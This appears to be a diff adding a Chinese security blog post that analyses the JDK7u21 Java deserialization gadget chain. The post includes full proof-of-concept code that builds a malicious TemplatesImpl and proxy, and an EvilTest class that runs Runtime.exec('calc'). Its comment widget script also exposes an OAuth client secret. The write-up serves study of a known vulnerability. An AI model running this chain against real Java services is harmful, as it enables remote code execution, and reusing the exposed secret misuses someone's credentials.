@@ -1,0 +1,615 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>JDK7u21反序列化链分析 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="JDK7u21反序列化链分析 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="0x00前言
+前段时间一直忙着HW和重保，Java反序列化的学习也因此搁置了一段时间，现在来学一下非常经典的一条反序列化链——JDK7u21原生链。
+0x01版本限制
+顾名思义，只能在jdk版本&lt;=jdk7u21的时候，才能使用这条链..." />
+    <meta name="keywords" content="Java,反序列化,动态代理" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              JDK7u21反序列化链分析
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-11-02
+              </span>
+              <span>
+                12 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/Jb2lgvYBPU/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+                <a href="https://le1a.github.io/tag/etnFU0aVX71/" class="post-tag">
+                  # 动态代理
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="0x00前言">0x00前言</h2>
+<p>前段时间一直忙着HW和重保，Java反序列化的学习也因此搁置了一段时间，现在来学一下非常经典的一条反序列化链——JDK7u21原生链。</p>
+<h2 id="0x01版本限制">0x01版本限制</h2>
+<p>顾名思义，只能在jdk版本&lt;=jdk7u21的时候，才能使用这条链</p>
+<h2 id="0x02反序列化链分析">0x02反序列化链分析</h2>
+<p>调用顺序:</p>
+<pre><code class="language-java">/*
+
+Gadget chain that works against JRE 1.7u21 and earlier. Payload generation has
+the same JRE version requirements.
+
+See: https://gist.github.com/frohoff/24af7913611f8406eaf3
+
+Call tree:
+
+LinkedHashSet.readObject()
+  LinkedHashSet.add()
+    ...
+      TemplatesImpl.hashCode() (X) //第一次加入恶意Templates对象，会计算一次hash值
+  LinkedHashSet.add()
+    ...
+      Proxy(Templates).hashCode() (X)
+        AnnotationInvocationHandler.invoke() (X)
+          AnnotationInvocationHandler.hashCodeImpl() (X)//代理对象走专门的Impl实现类去计算
+            String.hashCode() (0)  
+            //构造出hashCode=0，即刻使得代理对象的hash值等于恶意Templates对象的hash值
+            AnnotationInvocationHandler.memberValueHashCode() (X)
+              TemplatesImpl.hashCode() (X)
+      Proxy(Templates).equals()//set中加入代理对象时，就会与前面加入的恶意Templates调用equals
+        AnnotationInvocationHandler.invoke()//调用代理对象的任何方法都会调用Handler.invoke()
+          AnnotationInvocationHandler.equalsImpl()//通过if语句走入equalsImpl()
+            Method.invoke()//遍历所有方法并执行
+              ...
+                TemplatesImpl.getOutputProperties()//也就会走到getOutputProperties()
+                  TemplatesImpl.newTransformer()
+                    TemplatesImpl.getTransletInstance()
+                      TemplatesImpl.defineTransletClasses()
+                        ClassLoader.defineClass()
+                        Class.newInstance()
+                          ...
+                            MaliciousClass.&lt;clinit&gt;()
+                              ...
+                                Runtime.exec()
+ */
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/02/3e250b2fa95a6.png" alt="image-20221102153339440" loading="lazy"></figure>
+<p>通过之前学习过的CC链我们可以知道，在CC链中，有两个类可以当成命令执行的载体:</p>
+<ul>
+<li>org.apache.commons.collections.functors.ChainedTransformer</li>
+<li>org.apache.xalan.xsltc.trax.TemplatesImpl</li>
+</ul>
+<p>要想最终达到RCE的目的，通常都是需要调用<code>Runtime.exec</code>。使用<code>TemplatesImpl</code>的话需要满足以下几个条件:</p>
+<ol>
+<li>TemplatesImpl类的<code>_name变量</code>!=null</li>
+<li>TemplatesImpl类的<code>_class</code>变量 == null</li>
+<li>TemplatesImpl类的<code>bytecodes</code>变量!=null</li>
+<li><code>_bytecodes</code>变量存放的就是我们代码执行的类或字节码，恶意代码写在静态方法或构造方法中</li>
+<li><code>_bytecodes</code> 中的类必须继承<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>并重构方法</li>
+</ol>
+<p><code>TemplatesImpl</code>有四个方法:</p>
+<ul>
+<li>TemplatesImpl.getOutputProperties()</li>
+<li>TemplatesImpl.newTransformer()</li>
+<li>TemplatesImpl.getTransletInstance()</li>
+<li>TemplatesImpl.defineTransletClasses()</li>
+</ul>
+<p>这其中前两个方法是public属性，后面两个是private属性。</p>
+<p>所以我们就需要找到调用了<code>TemplatesImpl.getOutputProperties()</code>或者<code>TemplatesImpl.newTransformer()</code>的地方。在ysoserial中已经给出了答案——<code>sun.reflect.annotation.AnnotationInvocationHandler.invoke</code></p>
+<pre><code class="language-java">public Object invoke(Object proxy, Method method, Object[] args) {
+    String member = method.getName();
+    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();
+
+    // Handle Object and Annotation methods
+    if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp;
+        paramTypes[0] == Object.class)
+        return equalsImpl(args[0]);
+    assert paramTypes.length == 0;
+    if (member.equals(&quot;toString&quot;))
+        return toStringImpl();
+    if (member.equals(&quot;hashCode&quot;))
+        return hashCodeImpl();
+    if (member.equals(&quot;annotationType&quot;))
+        return type;
+
+    // Handle annotation member accessors
+    Object result = memberValues.get(member);
+
+    if (result == null)
+        throw new IncompleteAnnotationException(type, member);
+
+    if (result instanceof ExceptionProxy)
+        throw ((ExceptionProxy) result).generateException();
+
+    if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0)
+        result = cloneArray(result);
+
+    return result;
+}
+</code></pre>
+<p>这里首先是进行了一个判断，<code>member = method.getName();</code> 所以这里如果传入的方法名是equals，且参数的长度＝1的时候。便会返回<code>equalsImpl(args[0])</code></p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/02/1fcb25c2a79d4.png" alt="image-20221102140937765" loading="lazy"></figure>
+<p>equalsImpl()</p>
+<pre><code class="language-java">private Boolean equalsImpl(Object o) {
+    if (o == this)
+        return true;
+
+    if (!type.isInstance(o))
+        return false;
+    for (Method memberMethod : getMemberMethods()) {
+        String member = memberMethod.getName();
+        Object ourValue = memberValues.get(member);
+        Object hisValue = null;
+        AnnotationInvocationHandler hisHandler = asOneOfUs(o);
+        if (hisHandler != null) {
+            hisValue = hisHandler.memberValues.get(member);
+        } else {
+            try {
+                hisValue = memberMethod.invoke(o);
+            } catch (InvocationTargetException e) {
+                return false;
+            } catch (IllegalAccessException e) {
+                throw new AssertionError(e);
+            }
+        }
+        if (!memberValueEquals(ourValue, hisValue))
+            return false;
+    }
+    return true;
+}
+</code></pre>
+<p>这里首先判断了，传入的对象是否是type类的实例化对象，然后就会遍历type类的所有方法，并依次调用。只要我们在实例化 AnnotationInvocationHandler 时传⼊ Templates.class，然后equals() 的参数为 type 的实现类。</p>
+<p>这样就会自动遍历所有方法并调用，也自然就会去调用<code>TemplatesImpl.getOutputProperties()</code></p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/02/6514b366fb90a.png" alt="image-20221102153422621" loading="lazy"></figure>
+<p>现在后续链如何寻找呢？换句话说: 如何找到哪里调用了<code>AnnotationInvocationHandler.invoke</code></p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/02/7dccf5d16d7f3.png" alt="image-20221102160924265" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/02/2dbaa4cfb5b9c.png" alt="image-20221102161027395" loading="lazy"></figure>
+<p>在AnnotationInvocationHandler的开头其实就能看到醒目的注释，他是一个代理类并实现了InvocationHandler接口。</p>
+<blockquote>
+<p>当为某个类或接⼝指定 InvocationHandler 对象时，在调⽤该类或接⼝⽅法时，就会去调⽤指定 handler 的 invoke() ⽅法。因此，当我们使⽤ AnnotationInvocationHandler 创建 proxy object ，那么调⽤的所有⽅法都会变成对 invoke ⽅法的调⽤。</p>
+<p>​																																													——————Panda</p>
+</blockquote>
+<p>也就是在调用AnnotationInvocationHandler的任意方法时，都会去调用<code>AnnotationInvocationHandler.invoke()</code></p>
+<p>所以我们需要使用AnnotationInvocationHandler创建一个<code>Templates代理对象</code>，然后调用<code>Templates代理对象</code>的equals方法，便可以走到equalsImpl()，并且调用<code>TemplatesImpl.getOutputProperties()</code></p>
+<p>现在需要找到一个反序列化的载体，需要满足两个条件:</p>
+<ol>
+<li>要能够调⽤ proxy 的 equals ⽅法（这是我们刚才分析的）</li>
+<li>要有反序列化接⼝——要能调⽤ readObject() ⽅法（这样才可以将我们的序列化数据传进去开始反序列化）</li>
+</ol>
+<p>ysoserial的作者选择了<code>LinkedHashSet</code>类，它是<code>HashSet</code>的子类。在添加到set的元素会保持有序状态。在LinkedHashSet.readObject() 的⽅法中，各个元素被放进HashMap的时候，因为他不允许里面的元素重复，所以肯定会使用equals()进行比较。</p>
+<p>HashSet的readObject()</p>
+<pre><code class="language-java">private void readObject(java.io.ObjectInputStream s)
+    throws java.io.IOException, ClassNotFoundException {
+    // Read in any hidden serialization magic
+    s.defaultReadObject();
+
+    // Read in HashMap capacity and load factor and create backing HashMap
+    int capacity = s.readInt();
+    float loadFactor = s.readFloat();
+    map = (((HashSet)this) instanceof LinkedHashSet ?
+           new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :
+           new HashMap&lt;E,Object&gt;(capacity, loadFactor));
+
+    // Read in size
+    int size = s.readInt();
+
+    // Read in all elements in the proper order.
+    for (int i=0; i&lt;size; i++) {
+        E e = (E) s.readObject();
+        map.put(e, PRESENT);
+    }
+}
+</code></pre>
+<p>这里会循环的把set集合中的每一个对象都反序列化了之后，将其put到map中。</p>
+<pre><code class="language-java">public V put(K key, V value) {
+    if (key == null)
+        return putForNullKey(value);
+    int hash = hash(key);
+    int i = indexFor(hash, table.length);
+    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) {
+        Object k;
+        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {
+            V oldValue = e.value;
+            e.value = value;
+            e.recordAccess(this);
+            return oldValue;
+        }
+    }
+
+    modCount++;
+    addEntry(hash, key, value, i);
+    return null;
+}
+</code></pre>
+<p>首先判断key是否为空，然后后面的for循环中的if判断，<code>e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))</code>，</p>
+<p>如果想要⾛到 <code>key.equals(k)</code> 就必须满⾜ <code>e.hash == hash </code>并且 <code>k!=e.key </code>，所以需要key不一样，但是计算的hash是一样的，也就是hash碰撞。key不一样很好判断，因为本身传入的Templates对象就跟代理对象不一样。</p>
+<p>跟进一下hash运算的方法</p>
+<pre><code class="language-java">final int hash(Object k) {
+    int h = 0;
+    if (useAltHashing) {
+        if (k instanceof String) {
+            return sun.misc.Hashing.stringHash32((String) k);
+        }
+        h = hashSeed;
+    }
+
+    h ^= k.hashCode();
+
+    // This function ensures that hashCodes that differ only by
+    // constant multiples at each bit position have a bounded
+    // number of collisions (approximately 8 at default load factor).
+    h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);
+    return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);
+}
+</code></pre>
+<p>这里调用了<code>key.hashCode()</code>，因为传入的key是templates的代理对象，所以这里调用hashCode()会先去调用<code>AnnotationInvocationHandler</code>的<code>invoke()</code></p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/11/02/03470aa1a1bca.png" alt="image-20221102200633682" loading="lazy"></figure>
+<p>而这里则会调用<code>hashCodeImpl()</code> 继续跟进</p>
+<pre><code class="language-java">private int hashCodeImpl() {
+    int result = 0;
+    for (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) {
+        result += (127 * e.getKey().hashCode()) ^
+            memberValueHashCode(e.getValue());
+    }
+    return result;
+}
+</code></pre>
+<p>这里遍历memberValues对象中存储的键值对，当<code>e.getKey().hashCode()=0</code>时，并且value传入templates。</p>
+<p>0在同TemplatesImpl对象的hash值进行异或，得到的结果自然也是TemplatesImpl对象的hash值本身，也就满足了<code>e.hash=hash</code>。</p>
+<p>经过hash碰撞，发现当<code>key=f5a5a608</code>时，<code>e.getKey().hashCode()=0</code></p>
+<pre><code class="language-java">public static void bruteHashCode() { 
+	for (long i = 0; i &lt; 9999999999L; i++) { 
+		if (Long.toHexString(i).hashCode() == 0) {
+        	System.out.println(Long.toHexString(i)); 
+        } 
+    } 
+} 
+</code></pre>
+<h2 id="0x03poc">0x03POC</h2>
+<pre><code class="language-java">package com.le1a.jdk7u21;
+
+import com.le1a.util.SerializeUtil;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+
+import javax.xml.transform.Templates;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.LinkedHashSet;
+import java.util.Map;
+
+public class Jdk7u21Byle1a {
+    public static void main(String[] args) throws Exception{
+        byte[] evilCode = SerializeUtil.getEvilCode();
+        TemplatesImpl templates = new TemplatesImpl();
+        SerializeUtil.setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]{evilCode});
+        SerializeUtil.setFieldValue(templates,&quot;_name&quot;,&quot;le1a&quot;);
+
+        HashMap&lt;String, Object&gt; memberValues = new HashMap&lt;String, Object&gt;();
+        memberValues.put(&quot;f5a5a608&quot;,&quot;le1a&quot;);
+
+        //创建AnnotationInvocationHandler对象
+        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler)constructor.newInstance(Templates.class, memberValues);
+
+        //创建代理对象
+        Templates proxy = (Templates) Proxy.newProxyInstance(
+                Templates.class.getClassLoader(),
+                new Class[]{Templates.class},
+                handler
+        );
+
+
+        HashSet hashSet = new LinkedHashSet();
+        hashSet.add(templates);
+        hashSet.add(proxy);
+
+        memberValues.put(&quot;f5a5a608&quot;,templates);
+        byte[] bytes = SerializeUtil.serialize(hashSet);
+        SerializeUtil.unserialize(bytes);
+    }
+}
+</code></pre>
+<pre><code class="language-java">package com.le1a.util;
+
+
+import javassist.ClassPool;
+import javassist.CtClass;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+
+public class SerializeUtil {
+    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        return field.get(obj);
+    }
+
+    public static byte[] getEvilCode() throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazzz = pool.get(&quot;com.le1a.EvilTest&quot;);
+        byte[] code = clazzz.toBytecode();
+        return code;
+    }
+
+    public static void unserialize(byte[] bytes) throws Exception {
+        ByteArrayInputStream bain = new ByteArrayInputStream(bytes);
+        ObjectInputStream oin = new ObjectInputStream(bain);
+        oin.readObject();
+
+    }
+
+    public static byte[] serialize(Object o) throws Exception {
+        ByteArrayOutputStream baout = new ByteArrayOutputStream();
+        ObjectOutputStream oout = new ObjectOutputStream(baout);
+        oout.writeObject(o);
+        return baout.toByteArray();
+    }
+
+
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+}
+</code></pre>
+<pre><code class="language-java">package com.le1a;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+public class EvilTest extends AbstractTranslet {
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+    public EvilTest() throws Exception{
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+    }
+}
+</code></pre>
+<h2 id="0x04总结">0x04总结</h2>
+<p><strong>大概过程:</strong></p>
+<ol>
+<li>调用代理对象的方法时，会先调用<code>InvocationHandler.invoke()</code></li>
+<li>当调用的方法是<code>equals()</code>时，会走到<code>equalsImpl()</code>，其中会遍历该代理对象的所有方法并调用</li>
+<li>也就是说当传入的是Templates的代理对象时，会最终走到<code>TemplatesImpl.getOutputProperties()</code>，最终走到runtime.exec()</li>
+</ol>
+<p><strong>精华的点:</strong></p>
+<ol>
+<li>使HashSet中传入的两个对象的hash值相等，需要代理对象的<code>hashCode()</code>和<code>TemplatesImpl</code>对象的<code>hashCode()</code>相同。但是<code>TemplatesImpl</code>的<code>hashCode()</code>是个<code>Native()</code>方法，每次运行都会改变，所以不可控。通过<code>e.getKey().hashCode()=0</code>达到目的</li>
+<li>通过将一个恶意Templates对象和一个Templates代理对象放入HashSet。<code>Set</code>实际上相当于只存储key、不存储value的<code>Map</code>。我们经常用<code>Set</code>用于去除重复元素。因为对象不重复，因此就会涉及到比较，从而调用<code>equals()</code></li>
+</ol>
+<h2 id="0x05参考">0x05参考</h2>
+<p><a href="https://paper.seebug.org/1224/#2-jdk7u21">seebug</a></p>
+<p><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DJDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%A6%E4%B9%A0.md">feng</a></p>
+<p><a href="https://ch1e.cn/post/yuan-sheng-fan-xu-lie-hua-lian-jdk7u21/">ch1e</a></p>
+<p>知识星球——《代码审计》</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#0x00%E5%89%8D%E8%A8%80">0x00前言</a></li>
+<li><a href="#0x01%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6">0x01版本限制</a></li>
+<li><a href="#0x02%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90">0x02反序列化链分析</a></li>
+<li><a href="#0x03poc">0x03POC</a></li>
+<li><a href="#0x04%E6%80%BB%E7%BB%93">0x04总结</a></li>
+<li><a href="#0x05%E5%8F%82%E8%80%83">0x05参考</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/MTCTF_Light1ng/">
+              <h3 class="post-title">
+                MTCTF Writeup By Light1ng
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
